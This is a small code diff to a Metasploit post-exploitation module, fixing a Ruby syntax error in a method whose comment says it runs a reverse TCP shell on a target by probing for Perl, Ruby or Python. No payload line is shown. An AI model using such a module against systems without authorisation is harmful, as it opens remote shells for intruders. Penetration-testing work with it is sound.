@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Post
 
 	# Runs a reverse tcp shell with the scripting environment found
 	def auto_create_session(lhost,lport)
-
+		cmd = ""
 		if cmd_exec("perl -v") =~ /Larry/
 			print_status("Perl was found on target")
 			cmd = perl_session(lhost,lport)
@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Post
 			cmd = ruby_session(lhost,lport)
 			vprint_status("Running #{cmd}")
 
-		elif cmd_exec("python -V") =~ /Python 2\.(\d)/
+		elsif cmd_exec("python -V") =~ /Python 2\.(\d)/
 			print_status("Python was found on target")
 			cmd = python_session(lhost,lport)
 			vprint_status("Running #{cmd}")
